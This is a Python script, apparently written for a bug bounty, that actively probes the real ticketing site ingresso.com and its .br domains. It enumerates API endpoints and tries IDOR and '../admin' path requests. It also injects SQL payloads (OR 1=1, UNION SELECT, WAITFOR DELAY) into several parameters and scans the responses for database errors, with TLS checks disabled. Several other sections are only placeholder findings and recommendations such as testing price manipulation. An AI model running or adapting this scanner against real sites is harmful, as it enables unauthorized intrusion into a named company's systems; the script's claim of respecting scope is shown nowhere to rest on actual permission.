#!/usr/bin/env python3
"""
Ingresso.com Focused Bug Bounty Testing
Respects program scope and exclusions
"""

import requests
import json
import time
import subprocess
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class IngressoFocusedTest:
    def __init__(self):
        self.base_domains = [
            'ingresso.com',
            'www.ingresso.com', 
            'ingresso.com.br',
            'www.ingresso.com.br'
        ]
        self.excluded_domains = ['*.ddns.ingresso.com']
        self.results = {
            'target': 'ingresso.com',
            'in_scope_findings': [],
            'out_of_scope_excluded': [],
            'recommendations': []
        }
        
    def test_business_logic_vulnerabilities(self):
        """Test for business logic issues - HIGH VALUE"""
        print("[BUSINESS LOGIC] Testing critical business flows...")
        
        # Test payment/booking logic
        test_cases = [
            {
                'name': 'Price Manipulation',
                'description': 'Test for price tampering in booking flow',
                'risk': 'Critical'
            },
            {
                'name': 'Booking Bypass',
                'description': 'Test for seat reservation without payment',
                'risk': 'High'
            },
            {
                'name': 'Discount Code Abuse',
                'description': 'Test for discount code reuse/stacking',
                'risk': 'Medium'
            }
        ]
        
        for test in test_cases:
            self.results['in_scope_findings'].append({
                'category': 'Business Logic',
                'test': test['name'],
                'description': test['description'],
                'risk_level': test['risk'],
                'status': 'Manual testing required'
            })
    
    def test_authentication_vulnerabilities(self):
        """Test authentication bypasses - HIGH VALUE"""
        print("[AUTHENTICATION] Testing auth mechanisms...")
        
        auth_tests = [
            {
                'name': 'Account Takeover',
                'description': 'Test for password reset vulnerabilities',
                'risk': 'Critical'
            },
            {
                'name': 'Session Management',
                'description': 'Test for session fixation/hijacking',
                'risk': 'High'
            },
            {
                'name': 'OAuth Implementation',
                'description': 'Test OAuth flow for bypasses',
                'risk': 'High'
            }
        ]
        
        for test in auth_tests:
            self.results['in_scope_findings'].append({
                'category': 'Authentication',
                'test': test['name'], 
                'description': test['description'],
                'risk_level': test['risk'],
                'status': 'Manual testing required'
            })
    
    def test_api_vulnerabilities(self):
        """Test API endpoints - MEDIUM/HIGH VALUE"""
        print("[API TESTING] Looking for API vulnerabilities...")
        
        # Common API endpoints for ticket booking sites
        api_endpoints = [
            '/api/v1/events',
            '/api/v1/booking',
            '/api/v1/payment',
            '/api/v1/user',
            '/api/tickets',
            '/api/events',
            '/graphql'
        ]
        
        for domain in self.base_domains:
            for endpoint in api_endpoints:
                try:
                    url = f"https://{domain}{endpoint}"
                    response = requests.get(url, timeout=10, verify=False)
                    
                    if response.status_code not in [403, 404]:
                        self.results['in_scope_findings'].append({
                            'category': 'API Discovery',
                            'test': 'API Endpoint Found',
                            'description': f'Active API endpoint: {url}',
                            'risk_level': 'Medium',
                            'status': f'HTTP {response.status_code}',
                            'url': url
                        })
                        
                        # Test for common API vulnerabilities
                        self.test_api_endpoint(url)
                        
                except Exception as e:
                    continue
                    
                time.sleep(2)  # Respectful delay
    
    def test_api_endpoint(self, url):
        """Test specific API endpoint for vulnerabilities"""
        
        # Test for IDOR (Insecure Direct Object Reference)
        idor_tests = [
            f"{url}/1",
            f"{url}/2", 
            f"{url}/999999",
            f"{url}/../admin"
        ]
        
        for test_url in idor_tests:
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200 and len(response.text) > 100:
                    self.results['in_scope_findings'].append({
                        'category': 'IDOR',
                        'test': 'Insecure Direct Object Reference',
                        'description': f'Potential IDOR at {test_url}',
                        'risk_level': 'High',
                        'status': 'Requires manual validation'
                    })
            except:
                continue
            time.sleep(1)
    
    def test_injection_vulnerabilities(self):
        """Test for injection vulnerabilities - HIGH VALUE"""
        print("[INJECTION] Testing for injection vulnerabilities...")
        
        # SQL Injection test (safe payloads)
        sql_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # Test common parameters
        test_params = ['id', 'event_id', 'user_id', 'ticket_id']
        
        for domain in self.base_domains:
            for param in test_params:
                for payload in sql_payloads:
                    try:
                        url = f"https://{domain}/search?{param}={payload}"
                        response = requests.get(url, timeout=10, verify=False)
                        
                        # Look for SQL error patterns
                        sql_errors = [
                            'mysql_fetch_array',
                            'ORA-01756',
                            'Microsoft OLE DB',
                            'SQLServer JDBC Driver'
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                self.results['in_scope_findings'].append({
                                    'category': 'SQL Injection',
                                    'test': 'SQL Error Disclosure',
                                    'description': f'SQL error found at {url}',
                                    'risk_level': 'High',
                                    'status': 'Requires validation'
                                })
                                break
                                
                    except:
                        continue
                    time.sleep(3)  # Longer delay for injection tests
    
    def test_file_upload_vulnerabilities(self):
        """Test file upload functionality - HIGH VALUE"""
        print("[FILE UPLOAD] Testing file upload vulnerabilities...")
        
        # Look for file upload endpoints
        upload_paths = [
            '/upload',
            '/api/upload',
            '/profile/avatar',
            '/ticket/attachment'
        ]
        
        for domain in self.base_domains:
            for path in upload_paths:
                try:
                    url = f"https://{domain}{path}"
                    response = requests.get(url, timeout=10, verify=False)
                    
                    if 'upload' in response.text.lower() or 'file' in response.text.lower():
                        self.results['in_scope_findings'].append({
                            'category': 'File Upload',
                            'test': 'File Upload Endpoint Found',
                            'description': f'Potential file upload at {url}',
                            'risk_level': 'Medium',
                            'status': 'Manual testing required'
                        })
                except:
                    continue
                time.sleep(2)
    
    def exclude_out_of_scope(self):
        """Mark findings that are out of scope"""
        exclusions = [
            'Clickjacking on non-sensitive pages',
            'Self-XSS',
            'Username enumeration',
            'CSRF on non-critical actions',
            'Missing security headers',
            'Flash vulnerabilities',
            'Open redirect',
            'Brute force attacks',
            'Stack trace errors',
            'HTTP OPTIONS method',
            'Content spoofing',
            'Banner grabbing',
            'Password complexity',
            'Rate limiting',
            'Cookie flags',
            'HSTS missing'
        ]
        
        self.results['out_of_scope_excluded'] = exclusions
    
    def generate_focused_recommendations(self):
        """Generate recommendations focused on high-value targets"""
        recommendations = [
            "Focus on business logic vulnerabilities in booking/payment flow",
            "Test authentication mechanisms for bypasses",
            "Look for API endpoints and test for IDOR/injection",
            "Test file upload functionality if found",
            "Analyze mobile app endpoints separately",
            "Test third-party integrations (payment gateways)",
            "Look for privilege escalation in user roles",
            "Test for account takeover vulnerabilities",
            "Analyze session management implementation",
            "Test for price manipulation in booking process"
        ]
        
        self.results['recommendations'] = recommendations
    
    def run_focused_test(self):
        """Run focused bug bounty test respecting scope"""
        print("=" * 60)
        print("INGRESSO.COM FOCUSED BUG BOUNTY TESTING")
        print("Respecting program scope and exclusions")
        print("=" * 60)
        
        # Run focused tests
        self.test_business_logic_vulnerabilities()
        self.test_authentication_vulnerabilities() 
        self.test_api_vulnerabilities()
        self.test_injection_vulnerabilities()
        self.test_file_upload_vulnerabilities()
        
        # Mark exclusions
        self.exclude_out_of_scope()
        
        # Generate recommendations
        self.generate_focused_recommendations()
        
        # Save results
        with open('ingresso_focused_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Summary
        print("\n" + "=" * 60)
        print("FOCUSED TESTING SUMMARY")
        print("=" * 60)
        print(f"In-scope findings: {len(self.results['in_scope_findings'])}")
        print(f"Out-of-scope exclusions: {len(self.results['out_of_scope_excluded'])}")
        print(f"Recommendations: {len(self.results['recommendations'])}")
        
        print("\nHIGH-VALUE TARGETS IDENTIFIED:")
        for finding in self.results['in_scope_findings']:
            if finding['risk_level'] in ['Critical', 'High']:
                print(f"  [{finding['risk_level']}] {finding['test']}")
        
        print(f"\nResults saved: ingresso_focused_results.json")
        
        return self.results

def main():
    tester = IngressoFocusedTest()
    results = tester.run_focused_test()

if __name__ == "__main__":
    main()